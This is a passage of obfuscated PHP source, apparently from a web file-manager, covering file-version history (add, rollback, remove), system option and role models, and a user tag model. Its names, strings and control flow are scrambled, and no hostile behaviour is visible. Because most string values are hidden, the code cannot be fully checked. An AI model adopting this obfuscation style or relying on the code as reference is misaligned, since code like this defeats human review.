(substr($∆∞ÆΩÅ´, 0, strlen(DATA_PATH . $™óø⁄∫∫[1229])) == DATA_PATH . $™óø⁄∫∫[1229]) { return !1; } if ($ıÙïé®« == KodIO::KOD_SHARE_ITEM) { $¨óæŸ´ì = IO::init($∆∞ÆΩÅ´); if ($¨óæŸ´ì->pathParse[$™óø⁄∫∫[1154]]) { return self::parsePath($¨óæŸ´ì->pathParse[$™óø⁄∫∫[1154]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÉÚõ˛‹Œ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $™óø⁄∫∫[1230]); foreach ($ÉÚõ˛‹Œ as $®ö˛˛Ÿ±) { if (!$ıÙïé®« && substr($∆∞ÆΩÅ´, 0, strlen($®ö˛˛Ÿ±)) == $®ö˛˛Ÿ±) { return !1; } } self::log($GLOBALS[$™óø⁄∫∫[1149]] . $™óø⁄∫∫[1231] . $∆∞ÆΩÅ´); return $∆∞ÆΩÅ´; } private static function pathHistory($Õ¥—ôé») { $Ö∂÷Ö‚° =& $_SERVER[Á≈ ä ∞]; $—„¨Ä◊´ = self::$_historyBase . ltrim(KodIO::clear($Õ¥—ôé»), $Ö∂÷Ö‚°[18]); $—„¨Ä◊´ = str_replace(array($Ö∂÷Ö‚°[1232]), array($Ö∂÷Ö‚°[1233]), $—„¨Ä◊´); return $—„¨Ä◊´; } public static function log($€ÔãàŸ†) { } public static function historyCount($äÙÔﬁÅ™) { $πòïÃ∏˚ =& $_SERVER[Á≈ ä ∞]; $¡÷°’ıÁ = array(); $Ïá¥Ÿïî = array(); foreach ($äÙÔﬁÅ™ as $¿ÌÇ•π¶) { $±„Æ≤ÎË = get_path_father($¿ÌÇ•π¶); if (!$Ïá¥Ÿïî[$±„Æ≤ÎË]) { $Ïá¥Ÿïî[$±„Æ≤ÎË] = array(); } $Ïá¥Ÿïî[$±„Æ≤ÎË][] = get_path_this($¿ÌÇ•π¶); } foreach ($Ïá¥Ÿïî as $±„Æ≤ÎË => $‹ê∏¬¢Å) { $‰“Áê‹µ = self::parsePath($±„Æ≤ÎË); if (!$‰“Áê‹µ) { continue; } foreach ($‹ê∏¬¢Å as $∑¢÷ßîí) { $«€Ü≤ùÕ = self::listData(rtrim($‰“Áê‹µ, $πòïÃ∏˚[18]) . $πòïÃ∏˚[18] . $∑¢÷ßîí, !1); if ($«€Ü≤ùÕ && $«€Ü≤ùÕ[$πòïÃ∏˚[378]]) { $¡÷°’ıÁ[rtrim($±„Æ≤ÎË, $πòïÃ∏˚[18]) . $πòïÃ∏˚[18] . $∑¢÷ßîí] = count($«€Ü≤ùÕ[$πòïÃ∏˚[378]]); } } } return $¡÷°’ıÁ; } public static function add($ÂœÆ∏Â˙) { $©Â´°Ñ˙ =& $_SERVER[Á≈ ä ∞]; $êØøºÀÏ = self::listData($ÂœÆ∏Â˙); if (!$êØøºÀÏ) { return; } $ØèıπÀ∞ = Model($©Â´°Ñ˙[777])->get($©Â´°Ñ˙[1234]); $¥ÇÀ™ì™ = $GLOBALS[$©Â´°Ñ˙[16]][$©Â´°Ñ˙[99]][$©Â´°Ñ˙[1212]]; $öÉΩ≥’ú = $ØèıπÀ∞ == $©Â´°Ñ˙[1235] ? min(5, $¥ÇÀ™ì™) : $¥ÇÀ™ì™; if ($¥ÇÀ™ì™ <= 0) { return; } $É…„ÆäÈ = IO::info($ÂœÆ∏Â˙); $Ú«Á‚Œï = $êØøºÀÏ[$©Â´°Ñ˙[378]]; if ($É…„ÆäÈ[$©Â´°Ñ˙[86]] == 0) { return; } if ($É…„ÆäÈ[$©Â´°Ñ˙[86]] >= 1024 * 1024 * 500) { return !1; } $¬‚éµë≈ = IO::hashSimple($ÂœÆ∏Â˙); if ($Ú«Á‚Œï && $Ú«Á‚Œï[0][$©Â´°Ñ˙[187]] == $¬‚éµë≈) { return !0; } if (array_key_exists($©Â´°Ñ˙[212], $É…„ÆäÈ) && !$É…„ÆäÈ[$©Â´°Ñ˙[212]]) { return !1; } $ëãè‹ÙÜ = short_id(time()); $´ÆïÉè¥ = array($©Â´°Ñ˙[408] => $ëãè‹ÙÜ, $©Â´°Ñ˙[187] => $¬‚éµë≈, $©Â´°Ñ˙[42] => $É…„ÆäÈ[$©Â´°Ñ˙[42]] . $©Â´°Ñ˙[20] . date($©Â´°Ñ˙[1236]) . rand_string(1), $©Â´°Ñ˙[86] => $É…„ÆäÈ[$©Â´°Ñ˙[86]], $©Â´°Ñ˙[463] => USER_ID, $©Â´°Ñ˙[210] => time(), $©Â´°Ñ˙[1237] => $©Â´°Ñ˙[22]); IO::mkdir($êØøºÀÏ[$©Â´°Ñ˙[1238]]); $†‹Íè‰ó = IO::copy($ÂœÆ∏Â˙, $êØøºÀÏ[$©Â´°Ñ˙[1238]], !1, $´ÆïÉè¥[$©Â´°Ñ˙[42]]); if (!$†‹Íè‰ó) { self::clearEmptyFolder($êØøºÀÏ[$©Â´°Ñ˙[1238]]); return !1; } array_unshift($Ú«Á‚Œï, $´ÆïÉè¥); if (count($Ú«Á‚Œï) > $öÉΩ≥’ú) { $ç´’«◊ï = array_slice($Ú«Á‚Œï, $öÉΩ≥’ú); foreach ($ç´’«◊ï as $ºﬂ‚»éë) { IO::remove($êØøºÀÏ[$©Â´°Ñ˙[1238]] . $ºﬂ‚»éë[$©Â´°Ñ˙[42]]); } $Ú«Á‚Œï = array_slice($Ú«Á‚Œï, 0, $öÉΩ≥’ú); } return self::saveData($êØøºÀÏ[$©Â´°Ñ˙[1239]], $Ú«Á‚Œï); } public static function remove($ßè…ÿœ°, $ú∞”ï´ß) { $ˆÕ∑±í· =& $_SERVER[Á≈ ä ∞]; $ÜÃ◊ª«¿ = self::listData($ßè…ÿœ°); $∂ßõ˜Ò˘ = array(); if (!$ÜÃ◊ª«¿) { return !1; } foreach ($ÜÃ◊ª«¿[$ˆÕ∑±í·[378]] as $Û’õ†Ä ) { if ($Û’õ†Ä [$ˆÕ∑±í·[408]] == $ú∞”ï´ß) { IO::remove($ÜÃ◊ª«¿[$ˆÕ∑±í·[1238]] . $Û’õ†Ä [$ˆÕ∑±í·[42]]); continue; } $∂ßõ˜Ò˘[] = $Û’õ†Ä ; } return self::saveData($ÜÃ◊ª«¿[$ˆÕ∑±í·[1239]], $∂ßõ˜Ò˘); } public static function clear($Ô©Ω∫èò, $ê•˚œª˜ = true) { $ì‰•√‰’ =& $_SERVER[Á≈ ä ∞]; $ªÎœÕˆÊ = self::listData($Ô©Ω∫èò, $ê•˚œª˜); if (!$ªÎœÕˆÊ) { return !1; } foreach ($ªÎœÕˆÊ[$ì‰•√‰’[378]] as $≠€£Œ˙‘) { IO::remove($ªÎœÕˆÊ[$ì‰•√‰’[1238]] . $≠€£Œ˙‘[$ì‰•√‰’[42]]); } return self::saveData($ªÎœÕˆÊ[$ì‰•√‰’[1239]], array()); } public static function moveHistory($áÍ”Àâ‡, $Â´∞»Óù = '', $´ˆéõ”⁄ = '') { $Û¢˝˚Äƒ =& $_SERVER[Á≈ ä ∞]; $®ú–ËÙ† = self::listData($áÍ”Àâ‡, !1); if (!$®ú–ËÙ† || !$®ú–ËÙ†[$Û¢˝˚Äƒ[378]]) { return !1; } $Ë°®ÓÚŸ = $Û¢˝˚Äƒ[1226]; $Â´∞»Óù = $Â´∞»Óù ? $Â´∞»Óù : get_path_this($áÍ”Àâ‡); $´ˆéõ”⁄ = $´ˆéõ”⁄ ? $´ˆéõ”⁄ : $®ú–ËÙ†[$Û¢˝˚Äƒ[1238]]; $£Ä•†éœ = substr(get_path_this($®ú–ËÙ†[$Û¢˝˚Äƒ[1239]]), 0, -strlen($Ë°®ÓÚŸ)); foreach ($®ú–ËÙ†[$Û¢˝˚Äƒ[378]] as $ùéæ°≤¯ => $¨ò’¨§ò) { $„∂†Øû⁄ = $Â´∞»Óù . substr($¨ò’¨§ò[$Û¢˝˚Äƒ[42]], strlen($£Ä•†éœ)); $é›÷î◊⁄ = IO::move($®ú–ËÙ†[$Û¢˝˚Äƒ[1238]] . $¨ò’¨§ò[$Û¢˝˚Äƒ[42]], $´ˆéõ”⁄, !1, $„∂†Øû⁄); if ($é›÷î◊⁄) { $®ú–ËÙ†[$Û¢˝˚Äƒ[378]][$ùéæ°≤¯][$Û¢˝˚Äƒ[42]] = $„∂†Øû⁄; } } $®ú–ËÙ†[$Û¢˝˚Äƒ[1239]] = IO::move($®ú–ËÙ†[$Û¢˝˚Äƒ[1239]], $´ˆéõ”⁄, !1, $Â´∞»Óù . $Ë°®ÓÚŸ); self::saveData($®ú–ËÙ†[$Û¢˝˚Äƒ[1239]], $®ú–ËÙ†[$Û¢˝˚Äƒ[378]]); self::clearEmptyFolder($®ú–ËÙ†[$Û¢˝˚Äƒ[1238]]); } public static function rollback($–ª⁄ÇÚ•, $î∏û•ÏÂ) { $Î˛“›ı„ =& $_SERVER[Á≈ ä ∞]; $∂õüÕ‹á = self::listData($–ª⁄ÇÚ•); if (!$∂õüÕ‹á) { return; } $√¿©ñ©ü = IO::info($–ª⁄ÇÚ•); foreach ($∂õüÕ‹á[$Î˛“›ı„[378]] as $ñÛêì¢ => $óŒ˙ôﬂ°) { if ($óŒ˙ôﬂ°[$Î˛“›ı„[408]] == $î∏û•ÏÂ) { self::add($–ª⁄ÇÚ•); $”˛åÓÌ÷ = $∂õüÕ‹á[$Î˛“›ı„[1238]] . $óŒ˙ôﬂ°[$Î˛“›ı„[42]]; $µ≥¡ÿÉ— = IO::copy($”˛åÓÌ÷, IO::pathFather($–ª⁄ÇÚ•), REPEAT_REPLACE, $√¿©ñ©ü[$Î˛“›ı„[42]]); if ($µ≥¡ÿÉ—) { self::remove($–ª⁄ÇÚ•, $î∏û•ÏÂ); } return $µ≥¡ÿÉ—; } } return !1; } public static function setDetail($ùæÅ˙üΩ, $ãâ™…÷‹, $ﬁ≈Ø„˛Â) { $èÔ»˜˝È =& $_SERVER[Á≈ ä ∞]; $«å‡≈±« = self::listData($ùæÅ˙üΩ); if (!$«å‡≈±«) { return; } foreach ($«å‡≈±«[$èÔ»˜˝È[378]] as $∑„›¿Ö => $ŸÂ⁄ΩØÜ) { if ($ŸÂ⁄ΩØÜ[$èÔ»˜˝È[408]] == $ãâ™…÷‹) { $«å‡≈±«[$èÔ»˜˝È[378]][$∑„›¿Ö][$èÔ»˜˝È[1237]] = $ﬁ≈Ø„˛Â; self::saveData($«å‡≈±«[$èÔ»˜˝È[1239]], $«å‡≈±«[$èÔ»˜˝È[378]]); return !0; } } return !1; } public static function fileInfo($´»°ˆ›, $Â£Ÿé≤≤) { $‚÷Ê®ï∫ =& $_SERVER[Á≈ ä ∞]; $∑Ø‚›Éï = self::listData($´»°ˆ›); if (!$∑Ø‚›Éï) { show_json(LNG($‚÷Ê®ï∫[115]), !1); } $üéÊ¶⁄Õ = $‚÷Ê®ï∫[22]; foreach ($∑Ø‚›Éï[$‚÷Ê®ï∫[378]] as $ûˆã˜›Ã => $¸”õ√¶∂) { if ($¸”õ√¶∂[$‚÷Ê®ï∫[408]] != $Â£Ÿé≤≤) { continue; } $üéÊ¶⁄Õ = $∑Ø‚›Éï[$‚÷Ê®ï∫[1238]] . $¸”õ√¶∂[$‚÷Ê®ï∫[42]]; break; } if (!$üéÊ¶⁄Õ) { show_json(LNG($‚÷Ê®ï∫[115]), !1); } return IO::info($üéÊ¶⁄Õ); } public static function fileOut($æπÀ„ã€, $ü¡§Í≤Ë, $«¿˛≠¡ç = false) { $≤±ûºƒÛ =& $_SERVER[Á≈ ä ∞]; $≥Üùàâ = self::fileInfo($æπÀ„ã€, $ü¡§Í≤Ë); $õóù∞∂º =& $GLOBALS[$≤±ûºƒÛ[17]]; $«¿˛≠¡ç = isset($õóù∞∂º[$≤±ûºƒÛ[1202]]) && $õóù∞∂º[$≤±ûºƒÛ[1202]] == 1; if (isset($õóù∞∂º[$≤±ûºƒÛ[43]]) && $õóù∞∂º[$≤±ûºƒÛ[43]] == $≤±ûºƒÛ[1240]) { return IO::fileOutImage($≥Üùàâ[$≤±ûºƒÛ[94]], $õóù∞∂º[$≤±ûºƒÛ[1241]]); } IO::fileOut($≥Üùàâ[$≤±ûºƒÛ[94]], $«¿˛≠¡ç, get_path_this($æπÀ„ã€)); } public static function listData($·Ä‡˘‰Ó, $ä‹±¡ ∆ = true) { $·ºâ∞ëÏ =& $_SERVER[Á≈ ä ∞]; if ($ä‹±¡ ∆ && !IO::exist($·Ä‡˘‰Ó)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($·Ä‡˘‰Ó, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¡ˆìºµê = self::pathHistory($·Ä‡˘‰Ó); $üö€ËÖ∂ = array($·ºâ∞ëÏ[1239] => $¡ˆìºµê . $·ºâ∞ëÏ[1226], $·ºâ∞ëÏ[1238] => rtrim(get_path_father($¡ˆìºµê), $·ºâ∞ëÏ[18]) . $·ºâ∞ëÏ[18], $·ºâ∞ëÏ[378] => array()); $∏“ÇØí˜ = IO::getContent($üö€ËÖ∂[$·ºâ∞ëÏ[1239]]); if ($∏“ÇØí˜) { $çëÔÓ˙ø = json_decode($∏“ÇØí˜, !0); if (is_array($çëÔÓ˙ø)) { $üö€ËÖ∂[$·ºâ∞ëÏ[378]] = $çëÔÓ˙ø; } } return $üö€ËÖ∂; } private static function saveData($¢Ωã©≈±, $ÎÊüﬁèÏ) { $ÔÿùÎöµ =& $_SERVER[Á≈ ä ∞]; self::log($ÔÿùÎöµ[1242] . $¢Ωã©≈± . $ÔÿùÎöµ[81] . count($ÎÊüﬁèÏ), $ÔÿùÎöµ[759]); if ($ÎÊüﬁèÏ) { return IO::setContent($¢Ωã©≈±, json_encode($ÎÊüﬁèÏ)); } $≈í¥Ê‘ò = IO::pathFather($¢Ωã©≈±); IO::remove($¢Ωã©≈±); self::clearEmptyFolder($≈í¥Ê‘ò); return !0; } public static function clearEmptyFolder($õ…€ÍÈÔ) { $Æ•»àÙÒ =& $_SERVER[Á≈ ä ∞]; if (trim($õ…€ÍÈÔ, $Æ•»àÙÒ[18]) == trim(self::$_historyBase, $Æ•»àÙÒ[18])) { return; } $ƒ◊ÁÄ‘± = IO::pathFather($õ…€ÍÈÔ); $ﬂùïü˘Ã = IO::has($õ…€ÍÈÔ, !0); if ($ﬂùïü˘Ã[$Æ•»àÙÒ[217]] > 0 || $ﬂùïü˘Ã[$Æ•»àÙÒ[218]] > 0) { return; } IO::remove($õ…€ÍÈÔ); self::clearEmptyFolder($ƒ◊ÁÄ‘±); } private static function getBasePath() { $Ê∏ºΩ˙◊ =& $_SERVER[Á≈ ä ∞]; $ã ¿†Ï√ = Model($Ê∏ºΩ˙◊[1243])->get($Ê∏ºΩ˙◊[1244]); if ($ã ¿†Ï√) { if (!IO::exist($ã ¿†Ï√)) { IO::mkdir($ã ¿†Ï√); } if (get_path_this($ã ¿†Ï√) == $Ê∏ºΩ˙◊[1229]) { $–ã„”´Í = $Ê∏ºΩ˙◊[1245] . rand_string(8); @rename($ã ¿†Ï√, get_path_father($ã ¿†Ï√) . $Ê∏ºΩ˙◊[18] . $–ã„”´Í); $ã ¿†Ï√ = DATA_PATH . $–ã„”´Í . $Ê∏ºΩ˙◊[18]; file_put_contents(DATA_PATH . $Ê∏ºΩ˙◊[1246], $Ê∏ºΩ˙◊[22]); Model($Ê∏ºΩ˙◊[1243])->set($Ê∏ºΩ˙◊[1244], $ã ¿†Ï√); } return $ã ¿†Ï√; } $ã ¿†Ï√ = DATA_PATH . $Ê∏ºΩ˙◊[1245] . rand_string(8) . $Ê∏ºΩ˙◊[18]; $ã ¿†Ï√ = IO::mkdir($ã ¿†Ï√); $ã ¿†Ï√ = rtrim($ã ¿†Ï√, $Ê∏ºΩ˙◊[18]) . $Ê∏ºΩ˙◊[18]; file_put_contents($ã ¿†Ï√ . $Ê∏ºΩ˙◊[1246], $Ê∏ºΩ˙◊[22]); file_put_contents(DATA_PATH . $Ê∏ºΩ˙◊[1246], $Ê∏ºΩ˙◊[22]); Model($Ê∏ºΩ˙◊[1243])->set($Ê∏ºΩ˙◊[1244], $ã ¿†Ï√); return $ã ¿†Ï√; } } goto f∞ÉË≥¡æˆ; e»®âÖ∆Ω€: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\x6d\x5f\x6f\160\164\x69\x6f\156"; protected $jsonField = array("\155\145\x6e\x75", "\x72\157\x6c\145", "\162\157\154\145\x47\162\x6f\165\x70", "\x72\x65\147\x69\163\164", "\145\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ÏΩõÂ®∑) { return "\x53\x79\x73\x74\145\x6d\x4f\x70\164\151\x6f\156\137{$ÏΩõÂ®∑}"; } protected function optionDefault($£∫è˙≠É = '') { $‡£∑™€Œ =& $_SERVER[Á≈ ä ∞]; if ($£∫è˙≠É == $‡£∑™€Œ[22]) { return $GLOBALS[$‡£∑™€Œ[16]][$‡£∑™€Œ[390]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\162\157\154\145\x4c\151\x73\164"; public $field = array("\156\x61\x6d\145", "\x61\x75\164\x68", "\154\141\x62\x65\x6c", "\x64\151\x73\160\154\x61\x79", "\x73\171\163\x74\145\155", "\144\145\163\143", "\151\147\156\x6f\162\x65\105\x78\x74", "\151\147\x6e\x6f\x72\x65\106\151\154\x65\x53\x69\172\x65", "\141\144\155\151\156\151\163\x74\x72\141\164\x6f\x72", "\x73\157\x72\164"); public function listData($Å–ø˙›Ó = false, $öÃúﬂ¥£ = "\163\157\162\164", $∑â∂±≥ò = false) { $†””πªó =& $_SERVER[Á≈ ä ∞]; $¿ÌÃ°´ó = parent::listData($Å–ø˙›Ó, $öÃúﬂ¥£, $∑â∂±≥ò); if (!$Å–ø˙›Ó) { foreach ($¿ÌÃ°´ó as $∑åºï¿¿ => $ÆÖ∆≤) { if ($ÆÖ∆≤[$†””πªó[2028]] == 1) { $¿ÌÃ°´ó[$∑åºï¿¿][$†””πªó[462]] = LNG($†””πªó[2262]); } } } return $¿ÌÃ°´ó; } public function update($Â¨∆òÑØ, $—¶õõ⁄›) { $ŸÿÉÖï∏ =& $_SERVER[Á≈ ä ∞]; $ﬁ´ÃÁü˝ = parent::listData($Â¨∆òÑØ); $¬˛ïöç≈ = $this->findByName($—¶õõ⁄›[$ŸÿÉÖï∏[42]]); if (!$ﬁ´ÃÁü˝ || $¬˛ïöç≈ && $¬˛ïöç≈[$ŸÿÉÖï∏[408]] != $ﬁ´ÃÁü˝[$ŸÿÉÖï∏[408]]) { return !1; } if ($¬˛ïöç≈[$ŸÿÉÖï∏[2028]] == 1) { $—¶õõ⁄› = array($ŸÿÉÖï∏[42] => $—¶õõ⁄›[$ŸÿÉÖï∏[42]], $ŸÿÉÖï∏[1853] => $—¶õõ⁄›[$ŸÿÉÖï∏[1853]]); } $this->filterAuth($—¶õõ⁄›[$ŸÿÉÖï∏[422]]); return parent::update($Â¨∆òÑØ, $—¶õõ⁄›); } public function remove($Ê™¡œ˛Ü) { $∫ØÒÁÔ´ = parent::listData($Ê™¡œ˛Ü); if (!$∫ØÒÁÔ´ || $∫ØÒÁÔ´[$_SERVER[Á≈ ä ∞][1279]]) { return !1; } return parent::remove($Ê™¡œ˛Ü); } public function add($‹››ÑÛö) { $†≥≠Ç¬ß =& $_SERVER[Á≈ ä ∞]; $ï„Ø·´™ = $‹››ÑÛö[$†≥≠Ç¬ß[42]]; if ($this->findByName($ï„Ø·´™)) { return !1; } $Öµ”ìÃÀ = array($†≥≠Ç¬ß[429] => $ï„Ø·´™, $†≥≠Ç¬ß[1836] => $†≥≠Ç¬ß[22], $†≥≠Ç¬ß[1832] => $†≥≠Ç¬ß[1840], $†≥≠Ç¬ß[2263] => 1, $†≥≠Ç¬ß[1835] => 0, $†≥≠Ç¬ß[2264] => 0, $†≥≠Ç¬ß[1834] => $this->getSort()); $‹››ÑÛö = array_merge($Öµ”ìÃÀ, $‹››ÑÛö); $this->filterAuth($‹››ÑÛö[$†≥≠Ç¬ß[422]]); return parent::insert($‹››ÑÛö); } private function getSort() { $Ïø¬ﬁ‰€ =& $_SERVER[Á≈ ä ∞]; $¨∑õ´â¨ = parent::listData(); $èòÜ†‹“ = array_to_keyvalue($¨∑õ´â¨, $Ïø¬ﬁ‰€[22], $Ïø¬ﬁ‰€[1854]); return empty($èòÜ†‹“) ? 0 : max($èòÜ†‹“) + 1; } private function filterAuth(&$Ìö¡Á·á) { $—çﬁÓ«π =& $_SERVER[Á≈ ä ∞]; $•§µ˙öê = array(); $„√í€Ëº = array_filter(explode($—çﬁÓ«π[60], $Ìö¡Á·á)); foreach ($„√í€Ëº as $Ìö¡Á·á) { $˜éê›Ñ‘ = explode($—çﬁÓ«π[20], $Ìö¡Á·á); if ($˜éê›Ñ‘[0] == $—çﬁÓ«π[2265] && $˜éê›Ñ‘[1] != $—çﬁÓ«π[1198]) { $ïû‰í§¶ = $˜éê›Ñ‘[0] . $—çﬁÓ«π[20] . $˜éê›Ñ‘[1] . $—çﬁÓ«π[2266]; if (!in_array($ïû‰í§¶, $„√í€Ëº)) { $•§µ˙öê[] = $ïû‰í§¶; } } $•§µ˙öê[] = $Ìö¡Á·á; } $Ìö¡Á·á = implode($—çﬁÓ«π[60], $•§µ˙öê); } public function findRoleDefault() { $£®ˆí¬⁄ =& $_SERVER[Á≈ ä ∞]; $¡ù ±Ï∂ = parent::listData(); $µÊÜÀ˜ˆ = !1; foreach ($¡ù ±Ï∂ as $∏ÄÎ˛ÔÉ) { if (!$∏ÄÎ˛ÔÉ || $∏ÄÎ˛ÔÉ[$£®ˆí¬⁄[1852]] == $£®ˆí¬⁄[207] || $∏ÄÎ˛ÔÉ[$£®ˆí¬⁄[2028]] == 1) { continue; } if (strstr($∏ÄÎ˛ÔÉ[$£®ˆí¬⁄[422]], $£®ˆí¬⁄[2267])) { continue; } if (!strstr($∏ÄÎ˛ÔÉ[$£®ˆí¬⁄[422]], $£®ˆí¬⁄[2268])) { continue; } if (!$µÊÜÀ˜ˆ) { $µÊÜÀ˜ˆ = $∏ÄÎ˛ÔÉ; continue; } $˙ˆÙË§… = explode($£®ˆí¬⁄[60], $µÊÜÀ˜ˆ[$£®ˆí¬⁄[422]]); $ﬂó≈ú¬Ê = explode($£®ˆí¬⁄[60], $∏ÄÎ˛ÔÉ[$£®ˆí¬⁄[422]]); if (count($˙ˆÙË§…) > count($ﬂó≈ú¬Ê)) { $µÊÜÀ˜ˆ = $∏ÄÎ˛ÔÉ; } } return $µÊÜÀ˜ˆ ? $µÊÜÀ˜ˆ[$£®ˆí¬⁄[408]] : $£®ˆí¬⁄[22]; } public function sort($àóƒì„´, $¶úÓéäﬂ) { return parent::update($àóƒì„´, $¶úÓéäﬂ); } } goto Då◊ıö·ûÎ; dâ≠™í≈©“: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($Œã⁄ıÍ‰) { $É–„æÖﬁ =& $_SERVER[Á≈ ä ∞]; return array($É–„æÖﬁ[1941] => array($É–„æÖﬁ[2320] . USER_ID, $É–„æÖﬁ[1942])); } protected function listData() { $ùŸæ˝îé =& $_SERVER[Á≈ ä ∞]; $æ‡óÍÜ´ = array($ùŸæ˝îé[1649] => USER_ID, $ùŸæ˝îé[493] => array($ùŸæ˝îé[1945], 0)); $ìÂçÊ¢Ä = $ùŸæ˝îé[2321]; $øˆÑ†Ûá = $this->field($ìÂçÊ¢Ä)->where($æ‡óÍÜ´)->order($ùŸæ˝îé[1948])->select(); return $øˆÑ†Ûá ? $øˆÑ†Ûá : array(); } protected function addToTag($∞œ€Å≠∑, $™ÒÆ “Ò) { $ÏÙŸÏì≠ =& $_SERVER[Á≈ ä ∞]; if (!Model($ÏÙŸÏì≠[2085])->listData($™ÒÆ “Ò)) { return !1; } if (is_numeric($∞œ€Å≠∑)) { $•øÙ≥¡Ü = Model($ÏÙŸÏì≠[832])->pathInfo($∞œ€Å≠∑); if (!$•øÙ≥¡Ü) { return !1; } } else { $•øÙ≥¡Ü = IO::infoSimple($∞œ€Å≠∑); if (!$•øÙ≥¡Ü) { return !1; } $¬ÅÚ„ñÄ = $•øÙ≥¡Ü[$ÏÙŸÏì≠[42]]; $πëñÿ‹¯ = $•øÙ≥¡Ü[$ÏÙŸÏì≠[43]]; if (isset($•øÙ≥¡Ü[$ÏÙŸÏì≠[419]])) { $πëñÿ‹¯ = $•øÙ≥¡Ü[$ÏÙŸÏì≠[419]] == $ÏÙŸÏì≠[98] ? $ÏÙŸÏì≠[85] : $ÏÙŸÏì≠[209]; } } $ê˝ïï›û = array($ÏÙŸÏì≠[1649] => USER_ID, $ÏÙŸÏì≠[493] => $™ÒÆ “Ò, $ÏÙŸÏì≠[430] => $∞œ€Å≠∑, $ÏÙŸÏì≠[431] => $πëñÿ‹¯ ? $πëñÿ‹¯ : $ÏÙŸÏì≠[425], $ÏÙŸÏì≠[429] => $¬ÅÚ„ñÄ ? $¬ÅÚ„ñÄ : $ÏÙŸÏì≠[22], $ÏÙŸÏì≠[1834] => 0); if ($this->where($ê˝ïï›û)->find()) { return !1; } return $this->add($ê˝ïï›û); } protected function removeFromTag($õ±”ôÒ‘, $ÈºÒªç†) { $´π’ÿ÷– =& $_SERVER[Á≈ ä ∞]; if (!Model($´π’ÿ÷–[2085])->listData($ÈºÒªç†)) { return !1; } if (is_array($õ±”ôÒ‘)) { $õ±”ôÒ‘ = array($´π’ÿ÷–[17], $õ±”ôÒ‘); } $∫ı£Ûõı = array($´π’ÿ÷–[1649] => USER_ID, $´π’ÿ÷–[493] => $ÈºÒªç†, $´π’ÿ÷–[430] => $õ±”ôÒ‘); return $this->where($∫ı£Ûõı)->delete(); } protected function removeByTag($ôÄÒ‚ﬁ˙) { $ÆîÕÎÇÁ =& $_SERVER[Á≈ ä ∞]; if (!$ôÄÒ‚ﬁ˙) { return !1; } $¢Åï—©÷ = array($ÆîÕÎÇÁ[1649] => USER_ID, $ÆîÕÎÇÁ[493] => $ôÄÒ‚ﬁ˙); return $this->where($¢Åï—©÷)->delete(); } protected function removeBySource($¸˜Ëß∑ø) { $‘ñ…éº€ =& $_SERVER[Á≈ ä ∞]; if (is_array($¸˜Ëß∑ø)) { $¸˜Ëß∑ø = array($‘ñ…éº€[17], $¸˜Ëß∑ø); } $ˆ˚»«ƒö = array($‘ñ…éº€[1649] => USER_ID, $‘ñ…éº€[493] => array($‘ñ…éº€[1017], 0), $‘ñ…éº€[430] => $¸˜Ëß∑ø); return $this->where($ˆ˚»«ƒö)->delete(); } }